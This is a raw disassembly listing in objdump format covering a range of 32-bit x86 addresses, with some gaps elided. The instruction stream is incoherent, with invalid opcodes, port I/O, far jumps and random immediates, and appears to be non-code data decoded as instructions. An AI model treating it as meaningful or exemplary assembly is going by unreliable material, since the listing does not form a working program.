  42efec:	push   eax
  42efed:	xchg   ecx,eax
  42efee:	sub    BYTE PTR [ebx+0x3a],dl
  42eff1:	fbld   TBYTE PTR [edi+edi*8+0x1460aae5]
  42eff8:	cmp    BYTE PTR cs:[ecx],dh
  42effb:	leave  
  42effc:	and    DWORD PTR [edi-0x30e37e2d],edi
  42f002:	mov    edx,0xef975457
  42f007:	push   esp
  42f008:	mov    al,0xea
  42f00a:	dec    esp
  42f00b:	push   ss
  42f00c:	jmp    0x78f24589
  42f011:	call   0x717bf5e3
  42f016:	gs push 0x3d12c3f3
  42f01c:	sti    
  42f01d:	or     al,dh
  42f01f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f020:	stos   DWORD PTR es:[edi],eax
  42f021:	into   
  42f022:	fist   WORD PTR [edi+esi*4-0x33]
  42f026:	mov    dh,0xcd
  42f028:	cmovnp edi,DWORD PTR [ecx-0xac2f422]
  42f02f:	adc    al,0xb5
  42f031:	retf   0xd54
  42f034:	jge    0x42f0af
  42f036:	mov    dl,BYTE PTR [ecx-0x33]
  42f039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f03a:	or     bl,BYTE PTR [ebx+ebx*4-0x78]
  42f03e:	inc    esi
  42f03f:	mov    eax,0x31
	...
  42f0b4:	mov    eax,ds:0x7e061ecf
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	bound  ebx,QWORD PTR [ebx]
  42f0c1:	and    eax,0xf08fa93c
  42f0c6:	add    DWORD PTR [eax],eax
  42f0c8:	cmc    
  42f0c9:	add    BYTE PTR [eax],al
  42f0cb:	add    ah,ch
  42f0cd:	cmp    BYTE PTR [ecx+0x7c3b6b2],al
  42f0d3:	and    esi,0x472b396c
  42f0d9:	mov    eax,ds:0x590d4488
  42f0de:	mov    ebp,0x1d2ae9d5
  42f0e3:	dec    ebp
  42f0e4:	sti    
  42f0e5:	imul   eax,DWORD PTR [ebp-0x4d],0x472af807
  42f0ec:	or     bl,BYTE PTR [edx-0x11f1bd04]
  42f0f2:	xchg   ecx,eax
  42f0f3:	mov    ah,0x69
  42f0f5:	js     0x42f096
  42f0f7:	das    
  42f0f8:	jno    0x42f154
  42f0fa:	imul   edi,esp,0x6b696b44
  42f100:	ds xchg ebx,edi
  42f103:	stos   DWORD PTR es:[edi],eax
  42f104:	push   0xca8812a1
  42f109:	pop    edi
  42f10a:	inc    edx
  42f10b:	out    dx,al
  42f10c:	retf   0xebd0
  42f10f:	sbb    DWORD PTR [edx+eax*1+0x41],esi
  42f113:	mov    ah,0xdb
  42f115:	push   ebp
  42f116:	adc    eax,0x239fcd3b
  42f11b:	sbb    ebp,esi
  42f11d:	loopne 0x42f0b9
  42f11f:	lock fwait
  42f121:	test   eax,0x7192146c
  42f126:	mov    ch,0xed
  42f128:	sub    al,0x4
  42f12a:	push   ss
  42f12b:	mov    esi,0xd0c898e9
  42f130:	mul    BYTE PTR [ebx-0x7a6a8ce]
  42f136:	mov    DWORD PTR [esi+0x55225079],edx
  42f13c:	jae    0x42f135
  42f13e:	(bad)  
  42f13f:	repnz ss out 0x82,al
  42f143:	pop    edi
  42f144:	add    al,0x47
  42f146:	xchg   ecx,ebx
  42f148:	push   ss
  42f149:	in     al,dx
  42f14a:	mov    dl,0xdc
  42f14c:	xor    al,0x90
  42f14e:	imul   esi,ebp,0xffffffe0
  42f151:	or     DWORD PTR [edi],esp
  42f153:	and    eax,0x5ec4e60a
  42f158:	loop   0x42f13b
  42f15a:	xchg   DWORD PTR [ecx],edx
  42f15c:	mov    DWORD PTR [edx+0x7c56ff3a],edi
  42f162:	dec    eax
  42f163:	sbb    DWORD PTR [edx-0x7d],edx
  42f166:	inc    edi
  42f167:	push   DWORD PTR [ecx]
  42f169:	add    esi,ecx
  42f16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f16c:	les    edx,FWORD PTR [esi-0x22]
  42f16f:	pop    ss
  42f170:	add    ah,BYTE PTR [eax]
  42f172:	pushf  
  42f173:	(bad)  
  42f174:	xor    dl,BYTE PTR [edx-0x652eadc6]
  42f17a:	sar    al,1
  42f17c:	mov    ch,0x4
  42f17e:	pop    ss
  42f17f:	(bad)  
  42f180:	div    BYTE PTR [ecx]
  42f182:	outs   dx,DWORD PTR ds:[esi]
  42f183:	push   edi
  42f184:	ss mov ch,0xe0
  42f187:	fdivr  QWORD PTR [esi-0x46]
  42f18a:	stc    
  42f18b:	icebp  
  42f18c:	jns    0x42f1f8
  42f18e:	or     al,dh
  42f190:	cmp    cl,cl
  42f192:	push   ds
  42f193:	aaa    
  42f194:	f2xm1  
  42f196:	sbb    al,0x61
  42f198:	adc    bh,BYTE PTR ds:0xca439eb9
  42f19e:	inc    eax
  42f19f:	arpl   WORD PTR [edx-0x2a],ax
  42f1a2:	xchg   esi,eax
  42f1a3:	and    DWORD PTR [ebp+0x3c],ebx
  42f1a6:	or     DWORD PTR [edi+0x399fcc8d],0xfea7e91f
  42f1b0:	inc    esi
  42f1b1:	adc    DWORD PTR [ebp-0xd],0x16bf3d53
  42f1b8:	dec    ebp
  42f1b9:	and    dh,ch
  42f1bb:	jl     0x42f1fb
  42f1bd:	enter  0x3a36,0xd6
	...
  42f231:	add    BYTE PTR [eax],al
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	arpl   WORD PTR [esi],si
  42f242:	dec    ebp
  42f243:	pop    esp
  42f244:	test   cl,dh
  42f246:	add    DWORD PTR [eax],eax
  42f248:	cmc    
  42f249:	add    BYTE PTR [eax],al
  42f24b:	add    BYTE PTR [ebx+0x7b],bh
  42f24e:	inc    ebx
  42f24f:	out    0x94,al
  42f251:	sti    
  42f252:	xchg   esi,eax
  42f253:	es cmc 
  42f255:	(bad)  
  42f256:	les    esp,FWORD PTR [edx-0x37]
  42f259:	xchg   ebx,eax
  42f25a:	push   ss
  42f25b:	ror    ebp,1
  42f25d:	add    eax,0x5dea3603
  42f262:	xor    DWORD PTR [edi-0x5d],edx
  42f265:	add    al,0xd
  42f267:	cld    
  42f268:	es (bad) 
  42f26a:	lock dec esi
  42f26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f26d:	mov    ecx,0xabdceca9
  42f272:	lea    eax,[edx+0x4]
  42f275:	inc    eax
  42f276:	push   ebp
  42f277:	repz cmpxchg DWORD PTR [esp+esi*2],esi
  42f27c:	jp     0x42f2e2
  42f27e:	dec    ebx
  42f27f:	sub    BYTE PTR [edx],0x3d
  42f282:	dec    ecx
  42f283:	out    0xb,eax
  42f285:	xchg   ecx,eax
  42f286:	add    esi,edx
  42f288:	js     0x42f22c
  42f28a:	add    ecx,esi
  42f28c:	fsubr  st(1),st
  42f28e:	and    ah,BYTE PTR [bp+si-0x71]
  42f292:	je     0x42f2fb
  42f294:	mov    dl,0xf7
  42f296:	pusha  
  42f297:	jno    0x42f27e
  42f299:	push   ebx
  42f29a:	cmp    al,0x25
  42f29c:	pop    ebp
  42f29d:	and    dh,BYTE PTR [ecx]
  42f29f:	sahf   
  42f2a0:	xor    BYTE PTR cs:[edx-0x18d58e06],ch
  42f2a7:	mov    ch,0x8c
  42f2a9:	mov    bh,0x6e
  42f2ab:	rol    ecx,1
  42f2ad:	inc    ebp
  42f2ae:	ins    DWORD PTR es:[edi],dx
  42f2af:	cmp    ah,BYTE PTR [edi-0x7a]
  42f2b2:	pop    ss
  42f2b3:	xor    eax,0xd93d5b67
  42f2b8:	mov    bh,0xbb
  42f2ba:	adc    edx,DWORD PTR [ebx-0x4cbaf314]
  42f2c0:	push   edi
  42f2c1:	sub    esp,ebx
  42f2c3:	in     eax,dx
  42f2c4:	js     0x42f342
  42f2c6:	scas   eax,DWORD PTR es:[edi]
  42f2c7:	rcl    BYTE PTR [esp+ebx*2+0x3399521],1
  42f2ce:	sub    DWORD PTR [esi+0x438ba602],0x12cc0216
  42f2d8:	loop   0x42f290
  42f2da:	(bad)  
  42f2db:	and    BYTE PTR ds:0xf7c243a2,al
  42f2e1:	ja     0x42f345
  42f2e3:	cmp    ch,BYTE PTR [esi]
  42f2e5:	dec    edx
  42f2e6:	or     al,0x63
  42f2e8:	mov    ebx,0x5c981b3d
  42f2ed:	ror    DWORD PTR [ebx],1
  42f2ef:	add    ah,bh
  42f2f1:	test   BYTE PTR [esi+edi*8],ah
  42f2f4:	push   eax
  42f2f5:	inc    edi
  42f2f6:	sub    edi,eax
  42f2f8:	jl     0x42f2e5
  42f2fa:	cwde   
  42f2fb:	dec    esi
  42f2fc:	and    DWORD PTR [esi+0x3d],ebx
  42f2ff:	pop    ds
  42f300:	jmp    0x42f2da
  42f302:	ror    DWORD PTR [edx-0x1c74b963],cl
  42f308:	fst    st(2)
  42f30a:	and    al,BYTE PTR [ebx-0x23e2a7c8]
  42f310:	cdq    
  42f311:	in     al,dx
  42f312:	jb     0x42f2c5
  42f314:	test   DWORD PTR [ebx],edx
  42f316:	mov    edi,DWORD PTR [edx-0x33]
  42f319:	push   edi
  42f31a:	mov    DWORD PTR [esi-0x6d],edi
  42f31d:	ret    0xaf86
  42f320:	mov    ah,0x38
  42f322:	jmp    0x42f2cd
  42f324:	push   edi
  42f325:	popf   
  42f326:	dec    ebp
  42f327:	std    
  42f328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f329:	sub    al,0x71
  42f32b:	dec    eax
  42f32c:	or     eax,0x7ecaf072
  42f331:	out    dx,al
  42f332:	sub    BYTE PTR [esp+esi*1-0x7dfaa66b],bl
  42f339:	adc    eax,0x7571e2e
  42f33e:	jmp    0x4375d7
	...
  42f3b3:	add    dl,ah
  42f3b5:	mov    ebp,0xe7dfc7dc
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	mov    cl,0xe9
  42f3c2:	aam    0xce
  42f3c4:	jns    0x42f3b8
  42f3c6:	add    DWORD PTR [eax],eax
  42f3c8:	cmc    
  42f3c9:	add    BYTE PTR [eax],al
  42f3cb:	add    BYTE PTR [ebx+edi*2+0x49c377bc],bh
  42f3d2:	ins    BYTE PTR es:[edi],dx
  42f3d3:	mov    ah,0x93
  42f3d5:	mov    eax,ds:0xa738fa10
  42f3da:	std    
  42f3db:	and    edi,0x1a2e0a32
  42f3e1:	stos   BYTE PTR es:[edi],al
  42f3e2:	push   ebx
  42f3e3:	daa    
  42f3e4:	push   0xfffffffc
  42f3e6:	xchg   ebp,eax
  42f3e7:	pop    ds
  42f3e8:	mov    ds:0x64996da3,al
  42f3ed:	mov    edi,0x5b3a3147
  42f3f2:	outs   dx,DWORD PTR ds:[esi]
  42f3f3:	fdivr  st,st(0)
  42f3f5:	inc    edx
  42f3f6:	stos   BYTE PTR es:[edi],al
  42f3f7:	ret    
  42f3f8:	int3   
  42f3f9:	pop    edi
  42f3fa:	cmp    al,0xa
  42f3fc:	xchg   DWORD PTR ds:0x1c9dc979,edi
  42f402:	ja     0x42f3aa
  42f404:	(bad)  
  42f406:	fwait
  42f407:	popf   
  42f408:	xchg   ebx,eax
  42f409:	and    dl,bh
  42f40b:	test   al,0x26
  42f40d:	cs mov eax,0xdee8e594
  42f413:	stc    
  42f414:	sbb    edi,DWORD PTR [edi+ecx*4+0x44]
  42f418:	hlt    
  42f419:	mov    edx,0xcd5c9cee
  42f41e:	inc    edx
  42f41f:	sbb    BYTE PTR [ebp-0x5ca4ffd7],al
  42f425:	ins    DWORD PTR es:[edi],dx
  42f426:	std    
  42f427:	fdivr  DWORD PTR [ebx]
  42f429:	inc    edx
  42f42a:	push   esi
  42f42b:	enter  0xd6d9,0xb6
  42f42f:	fcomp  QWORD PTR [esi-0xa]
  42f432:	out    dx,al
  42f433:	mov    esp,0x2ef8b926
  42f438:	(bad)  
  42f43a:	pop    ebx
  42f43b:	adc    eax,0x7dab48ff
  42f440:	mov    DWORD PTR [eax+0x63],eax
  42f443:	mov    cl,0xe3
  42f445:	push   ds
  42f446:	pop    edx
  42f447:	sbb    edi,DWORD PTR [ebp-0x322c9556]
  42f44d:	xor    al,0x38
  42f44f:	sub    edi,DWORD PTR [esp+ecx*2+0x46]
  42f453:	lahf   
  42f454:	lods   eax,DWORD PTR ds:[esi]
  42f455:	push   eax
  42f456:	dec    eax
  42f457:	xchg   ebp,eax
  42f458:	inc    ebx
  42f459:	in     al,dx
  42f45a:	add    ah,BYTE PTR [ebp-0x56]
  42f45d:	xchg   DWORD PTR [esi-0x5b137b9],ebx
  42f463:	dec    ebp
  42f464:	out    0xec,al
  42f466:	not    BYTE PTR [ecx+0x72]
  42f469:	xchg   esi,eax
  42f46a:	in     eax,dx
  42f46b:	push   edi
  42f46c:	in     eax,dx
  42f46d:	dec    edi
  42f46e:	mov    al,0x23
  42f470:	pop    ds
  42f471:	shl    BYTE PTR [eax+esi*4-0x34a53914],1
  42f478:	or     ebx,0x23
  42f47b:	pop    ecx
  42f47c:	in     al,0x59
  42f47e:	stos   DWORD PTR es:[edi],eax
  42f47f:	lock dec edi
  42f481:	xor    DWORD PTR [esi+0x5f],edx
  42f484:	xor    dl,BYTE PTR fs:[edx+0x465b3d5f]
  42f48b:	jmp    DWORD PTR [ecx-0xe1f69dd]
  42f491:	sub    al,bh
  42f493:	xor    bh,dh
  42f495:	and    edi,edi
  42f497:	xchg   BYTE PTR [edi-0x6a],dh
  42f49a:	test   BYTE PTR [ecx],0x99
  42f49d:	xchg   esi,eax
  42f49e:	fstp   TBYTE PTR [edi+0x61]
  42f4a1:	mov    ebx,DWORD PTR [esi]
  42f4a3:	cs push ds
  42f4a5:	xor    bl,BYTE PTR [edi-0x5d34adff]
  42f4ab:	leave  
  42f4ac:	xchg   ecx,eax
  42f4ad:	mov    edi,DWORD PTR [esp+edx*4-0x45f025ad]
  42f4b4:	add    dl,dh
  42f4b6:	mov    ds:0xc1994a5c,eax
  42f4bb:	push   ss
  42f4bc:	(bad)  
  42f4bd:	lods   eax,DWORD PTR ds:[esi]
  42f4be:	loope  0x42f4f9
  42f4c0:	cwde   
	...
  42f531:	add    BYTE PTR [eax],al
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi+0x7c],bh
  42f541:	adc    DWORD PTR [edx+0x25],eax
  42f544:	outs   dx,BYTE PTR ds:[esi]
  42f545:	repz add DWORD PTR [eax],eax
  42f548:	cmc    
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    ch,dl
  42f54d:	jle    0x42f559
  42f54f:	inc    edi
  42f550:	cmp    eax,0x12015fcb
  42f555:	sub    eax,0x4c073275
  42f55a:	cmp    al,BYTE PTR [eax-0x3b9f4343]
  42f560:	loopne 0x42f509
  42f562:	mov    dl,0xaf
  42f564:	sar    dh,1
  42f566:	(bad)  
  42f567:	cld    
  42f568:	es popf 
  42f56a:	inc    ebp
  42f56b:	das    
  42f56c:	fnstsw WORD PTR [ebx]
  42f56e:	add    eax,0x2636f556
  42f573:	mov    bh,0x81
  42f575:	out    dx,eax
  42f576:	push   ebx
  42f577:	xchg   edi,eax
  42f578:	pop    ebp
  42f579:	push   ecx
  42f57a:	sti    
  42f57b:	lock mov ch,0x8a
  42f57e:	inc    eax
  42f57f:	sub    dl,ah
  42f581:	jl     0x42f526
  42f583:	pop    esp
  42f584:	aas    
  42f585:	and    al,0x35
  42f587:	scas   al,BYTE PTR es:[edi]
  42f588:	adc    edi,esp
  42f58a:	cmp    eax,0x1b1ba19c
  42f58f:	(bad)  
  42f590:	mov    edi,0x2af3e62f
  42f595:	jns    0x42f547
  42f597:	push   eax
  42f598:	and    ebx,DWORD PTR [ebx-0x2d]
  42f59b:	call   0x4830d6a3
  42f5a0:	jp     0x42f601
  42f5a2:	std    
  42f5a3:	mov    dh,bl
  42f5a5:	imul   edi,DWORD PTR [eax+0x6e6c59d],0x241b7e87
  42f5af:	dec    edi
  42f5b0:	rol    ch,0x7e
  42f5b3:	ins    BYTE PTR es:[edi],dx
  42f5b4:	loopne 0x42f547
  42f5b6:	mov    dh,BYTE PTR [esi-0x39]
  42f5b9:	xchg   ebx,eax
  42f5ba:	inc    esp
  42f5bb:	test   eax,0xcfd285db
  42f5c0:	mov    esp,0x6e0a7517
  42f5c5:	mov    ah,0xd4
  42f5c7:	jle    0x42f58f
  42f5c9:	and    ch,cl
  42f5cb:	jbe    0x42f58e
  42f5cd:	in     eax,0xfc
  42f5cf:	mov    cl,0x6
  42f5d1:	bound  eax,QWORD PTR [ecx]
  42f5d3:	int3   
  42f5d4:	sbb    al,0x8c
  42f5d6:	adc    ebx,DWORD PTR [eax]
  42f5d8:	push   edi
  42f5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f5da:	xchg   edi,eax
  42f5db:	jp     0x42f564
  42f5dd:	fnstcw WORD PTR [esi]
  42f5df:	add    eax,0x2f500ace
  42f5e4:	xor    edi,edx
  42f5e6:	xor    bl,BYTE PTR [ebx+0x5c569bc6]
  42f5ec:	js     0x42f575
  42f5ee:	or     esp,DWORD PTR [ebx+0x60c31862]
  42f5f4:	pop    edx
  42f5f5:	or     DWORD PTR [edi-0x54],esp
  42f5f8:	sub    al,0x3d
  42f5fa:	lds    esi,FWORD PTR [ebx-0x3d]
  42f5fd:	adc    bl,BYTE PTR [eax-0xd]
  42f600:	jmp    0xcda1:0x75997f65
  42f607:	and    ch,dh
  42f609:	jb     0x42f630
  42f60b:	or     DWORD PTR [ebp-0x52],ebx
  42f60e:	ins    DWORD PTR es:[edi],dx
  42f60f:	jmp    0xe4f:0xe57f91de
  42f616:	addr16 rcr dh,cl
  42f619:	sti    
  42f61a:	icebp  
  42f61b:	add    DWORD PTR [edx],edx
  42f61d:	sbb    edi,DWORD PTR [eax+0xd7ac58c]
  42f623:	xchg   esp,eax
  42f624:	and    dh,BYTE PTR [ebx]
  42f626:	aad    0x18
  42f628:	sahf   
  42f629:	les    ebp,FWORD PTR [edx+eax*8+0xc]
  42f62d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f62e:	inc    ecx
  42f62f:	xchg   ebp,eax
  42f630:	or     BYTE PTR [eax],bh
  42f632:	call   0x785c:0x7d4ea5d3
  42f639:	aam    0x8f
  42f63b:	jl     0x42f6b0
  42f63d:	outs   dx,BYTE PTR ds:[esi]
  42f63e:	or     al,0xfd
  42f640:	ins    DWORD PTR es:[edi],dx
	...
  42f6b1:	add    BYTE PTR [eax],al
  42f6b3:	add    BYTE PTR [edx+0x39],bl
  42f6b6:	dec    esi
  42f6b7:	sub    eax,0x7f7b7f6f
  42f6bc:	or     DWORD PTR [edi-0x6625cd1d],esi
  42f6c2:	xchg   edx,eax
  42f6c3:	ins    BYTE PTR es:[edi],dx
  42f6c4:	arpl   sp,si
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	cmc    
  42f6c9:	add    BYTE PTR [eax],al
  42f6cb:	add    BYTE PTR [edx],dh
  42f6cd:	dec    esp
  42f6ce:	inc    ebp
  42f6cf:	adc    eax,0x9c4b4ef7
  42f6d4:	jp     0x42f6ee
  42f6d6:	cmc    
  42f6d7:	pop    edx
  42f6d8:	xor    DWORD PTR [ecx+0x6d92e33d],edi
  42f6de:	outs   dx,BYTE PTR ds:[esi]
  42f6df:	xor    cl,BYTE PTR [edx]
  42f6e1:	pop    esi
  42f6e2:	int    0x84
  42f6e4:	rol    ebp,1
  42f6e6:	xchg   esp,eax
  42f6e7:	mov    al,ds:0x9573736f
  42f6ec:	cmp    dl,bh
  42f6ee:	xchg   DWORD PTR [eax+edx*4],esi
  42f6f1:	add    al,0x4d
  42f6f3:	iret   
  42f6f4:	cmp    BYTE PTR [edi-0x1b],bh
  42f6f7:	jns    0x42f6af
  42f6f9:	inc    esi
  42f6fa:	sub    bh,ch
  42f6fc:	mov    ds:0x72a561b0,eax
  42f701:	add    ch,BYTE PTR [esi+0x62c0cc12]
  42f707:	jle    0x42f701
  42f709:	ret    
  42f70a:	adc    esi,eax
  42f70c:	xor    eax,0x8ea9c8dc
  42f711:	arpl   sp,di
  42f713:	pushf  
  42f714:	leave  
  42f715:	mov    BYTE PTR [eax+edi*4],bh
  42f718:	cmp    DWORD PTR [edx-0x395b78f1],ebx
  42f71e:	scas   al,BYTE PTR es:[edi]
  42f71f:	mov    fs,WORD PTR [ecx+0x54]
  42f722:	xchg   ebx,eax
  42f723:	stos   BYTE PTR es:[edi],al
  42f724:	lahf   
  42f725:	mov    ebp,0xbd6a4fc
  42f72a:	xor    DWORD PTR [eax-0x3dbad80],edi
  42f730:	addr16 hlt 
  42f732:	push   ds
  42f733:	xchg   BYTE PTR [ebp-0x3b],dh
  42f736:	xchg   DWORD PTR [ecx-0x189e1b1e],esi
  42f73c:	mov    esi,0x2fa4aab5
  42f741:	stos   BYTE PTR es:[edi],al
  42f742:	lea    edi,[edi+0x16]
  42f745:	mov    esp,0x6ddd64dd
  42f74a:	out    0x38,al
  42f74c:	and    BYTE PTR [edx],dl
  42f74e:	sbb    edi,DWORD PTR [edx+0x66]
  42f751:	fwait
  42f752:	cmc    
  42f753:	pop    es
  42f754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f755:	xchg   edx,eax
  42f756:	mov    ah,BYTE PTR [edx+0x42]
  42f759:	mov    eax,0x8ce92f9f
  42f75e:	pop    edx
  42f75f:	lock fst QWORD PTR [ecx-0x5b2202a6]
  42f766:	shr    DWORD PTR [esi],cl
  42f768:	(bad)  
  42f76a:	sub    eax,0x237b3253
  42f76f:	pop    es
  42f770:	arpl   cx,sp
  42f772:	adc    eax,0xa53fdb2e
  42f777:	into   
  42f778:	out    0xff,eax
  42f77a:	or     DWORD PTR [ebx-0x62],eax
  42f77d:	xchg   esi,eax
  42f77e:	(bad)  
  42f782:	fistp  WORD PTR [esi-0x13]
  42f785:	(bad)  
  42f786:	lahf   
  42f787:	rcl    BYTE PTR [ecx+0x26],1
  42f78a:	dec    edx
  42f78b:	lahf   
  42f78c:	xor    al,0x26
  42f78e:	int3   
  42f78f:	imul   ebp,DWORD PTR [ecx+0x66],0xffffffe3
  42f793:	dec    ecx
  42f794:	sbb    esp,edi
  42f796:	test   eax,0x990428ae
  42f79b:	push   ss
  42f79c:	in     al,0x7e
  42f79e:	push   ecx
  42f79f:	addr16 dec edx
  42f7a1:	out    0x42,al
  42f7a3:	jb     0x42f75f
  42f7a5:	mov    ah,0xd0
  42f7a7:	mov    BYTE PTR [edi-0x538923b],bl
  42f7ad:	sub    ah,BYTE PTR ss:[ecx]
  42f7b0:	dec    eax
  42f7b1:	pop    eax
  42f7b2:	daa    
  42f7b3:	out    0x6f,eax
  42f7b5:	inc    edi
  42f7b6:	add    BYTE PTR [edi],0xb
  42f7b9:	push   edx
  42f7ba:	loope  0x42f7a2
  42f7bc:	ins    BYTE PTR es:[edi],dx
  42f7bd:	scas   al,BYTE PTR es:[edi]
  42f7be:	sbb    dl,0xb2
	...
  42f831:	add    BYTE PTR [eax],al
  42f833:	add    bl,al
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi-0x62af3771]
  42f841:	int3   
  42f842:	mov    ds:0x1f5583f,eax
  42f847:	add    ch,dh
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    BYTE PTR [eax+edi*4],ch
  42f84e:	icebp  
  42f84f:	neg    DWORD PTR [edx+ecx*4-0x1b]
  42f853:	mov    fs:0xe947ea28,eax
  42f859:	fidiv  DWORD PTR [esi+0x2f7d005f]
  42f85f:	lods   eax,DWORD PTR ds:[esi]
  42f860:	add    al,0x23
  42f862:	pop    es
  42f863:	fisttp WORD PTR es:[edi+0x79f4eac]
  42f86a:	and    cl,BYTE PTR [ecx]
  42f86c:	xchg   ecx,eax
  42f86d:	adc    bl,BYTE PTR [eax+edi*4+0x43]
  42f871:	xchg   edi,eax
  42f872:	(bad)  
  42f873:	xor    edx,ecx
  42f875:	in     eax,0xb6
  42f877:	ror    edi,cl
  42f879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f87a:	out    0xf1,eax
  42f87c:	mov    edi,0x71c548c9
  42f881:	jmp    0x42f862
  42f883:	pop    es
  42f884:	imul   edx,eax,0xffffff99
  42f887:	loopne 0x42f883
  42f889:	rcr    DWORD PTR [ecx-0x59],0x5b
  42f88d:	imul   esp,DWORD PTR [eax-0x25],0x611b9ae9
  42f894:	mov    bh,BYTE PTR [eax+0x38]
  42f897:	loope  0x42f8b1
  42f899:	loopne 0x42f8d7
  42f89b:	push   edi
  42f89c:	nop
  42f89d:	fs dec ebp
  42f89f:	push   ebx
  42f8a0:	sbb    DWORD PTR [ebp+0x1ed0c8d1],esi
  42f8a6:	(bad)  
  42f8a7:	stos   DWORD PTR es:[edi],eax
  42f8a8:	jmp    0x42f8b4
  42f8aa:	bsr    edi,esp
  42f8ad:	push   edi
  42f8ae:	or     ebx,DWORD PTR [edi-0x37fc6d3]
  42f8b4:	aas    
  42f8b5:	add    eax,0xead46587
  42f8ba:	adc    cl,ch
  42f8bc:	popf   
  42f8bd:	cmp    DWORD PTR [edi+0x32585960],eax
  42f8c3:	test   DWORD PTR [edi],0x7254cad5
  42f8c9:	jno    0x42f93b
  42f8cb:	lods   eax,DWORD PTR ds:[esi]
  42f8cc:	xchg   dl,dh
  42f8ce:	lods   eax,DWORD PTR ds:[esi]
  42f8cf:	ret    0xcdcc
  42f8d2:	aam    0xac
  42f8d4:	scas   eax,DWORD PTR es:[edi]
  42f8d5:	xchg   esi,eax
  42f8d6:	add    ebx,DWORD PTR [eax+0xd]
  42f8d9:	mov    ebp,0x590429d4
  42f8de:	and    DWORD PTR [eax*4-0x5fe560e2],edi
  42f8e5:	sub    esp,DWORD PTR [ebp+0x74]
  42f8e8:	or     BYTE PTR [edi-0x54e3c112],cl
  42f8ee:	pushf  
  42f8ef:	push   ecx
  42f8f0:	rcl    DWORD PTR [ebp+0x22],0x48
  42f8f4:	xchg   ebx,eax
  42f8f5:	in     eax,dx
  42f8f6:	inc    ecx
  42f8f7:	js     0x42f8d4
  42f8f9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42f8fb:	arpl   bx,bx
  42f8fd:	add    ebx,DWORD PTR [edx-0x4871c6f9]
  42f903:	lock and BYTE PTR [ebp+edx*8-0x2],ah
  42f908:	add    BYTE PTR [edi+0x30ea3670],dh
  42f90e:	int3   
  42f90f:	sbb    ah,BYTE PTR [ebp-0x5c76bfe4]
  42f915:	addr16 jge 0x42f8ba
  42f918:	or     BYTE PTR [eax+0xff51bc2],cl
  42f91e:	and    ch,bl
  42f920:	xchg   DWORD PTR [eax+0x7a0f88f7],ebx
  42f926:	stc    
  42f927:	mov    ebp,0xaeca8ec
  42f92c:	jge    0x42f8e8
  42f92e:	inc    ebx
  42f92f:	xchg   esi,eax
  42f930:	cmp    dh,BYTE PTR [edx]
  42f932:	inc    ebx
  42f933:	mov    dh,0xf5
  42f935:	mov    ecx,0x55c7c6f4
  42f93a:	add    eax,0x98409dcf
  42f93f:	aam    0xb3
	...
  42f9b1:	add    BYTE PTR [eax],al
  42f9b3:	add    ch,ah
  42f9b5:	mov    edx,0xebdfe392
  42f9ba:	cmc    
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	jge    0x42fa02
  42f9c2:	pop    edi
  42f9c3:	sahf   
  42f9c4:	dec    ebp
  42f9c5:	test   BYTE PTR [ecx],0x0
  42f9c8:	cmc    
  42f9c9:	add    BYTE PTR [eax],al
  42f9cb:	add    BYTE PTR [ecx-0x34fde91a],bh
  42f9d1:	jne    0x42fa3d
  42f9d3:	cmp    dh,bh
  42f9d5:	daa    
  42f9d6:	(bad)  
  42f9d7:	sbb    dl,bl
  42f9d9:	cmp    dl,BYTE PTR [edi-0x126b1ae]
  42f9df:	cmp    al,0x65
  42f9e1:	pop    ecx
  42f9e2:	lahf   
  42f9e3:	aaa    
  42f9e4:	pop    ss
  42f9e5:	pop    es
  42f9e6:	inc    ebp
  42f9e7:	sub    al,0x41
  42f9e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9ea:	je     0x42f9e8
  42f9ec:	sar    bh,0x1e
  42f9ef:	add    al,0x14
  42f9f1:	xchg   esi,esp
  42f9f3:	jg     0x42fa22
  42f9f5:	cld    
  42f9f6:	stc    
  42f9f7:	jae    0x42f9bd
  42f9f9:	jbe    0x42fa46
  42f9fb:	int3   
  42f9fc:	or     BYTE PTR [edi],bl
  42f9fe:	imul   ebx,edi,0xac79be4a
  42fa04:	or     ah,al
  42fa06:	call   DWORD PTR [eax-0x6b642af2]
  42fa0c:	aas    
  42fa0d:	xor    al,0x19
  42fa0f:	cdq    
  42fa10:	pop    ebx
  42fa11:	outs   dx,BYTE PTR ds:[esi]
  42fa12:	pop    ss
  42fa13:	cdq    
  42fa14:	mov    edx,0x164a63fc
  42fa19:	cmc    
  42fa1a:	inc    edi
  42fa1b:	push   ebx
  42fa1c:	loop   0x42f9ed
  42fa1e:	jmp    0x3c96:0x7401bde3
  42fa25:	arpl   bp,ax
  42fa27:	xchg   edx,eax
  42fa28:	jg     0x42f9ef
  42fa2a:	mov    ah,0x4e
  42fa2c:	add    dl,bh
  42fa2e:	lods   al,BYTE PTR ds:[esi]
  42fa2f:	pop    es
  42fa30:	neg    ch
  42fa32:	sbb    eax,0x9108e77d
  42fa37:	add    DWORD PTR [ecx],ecx
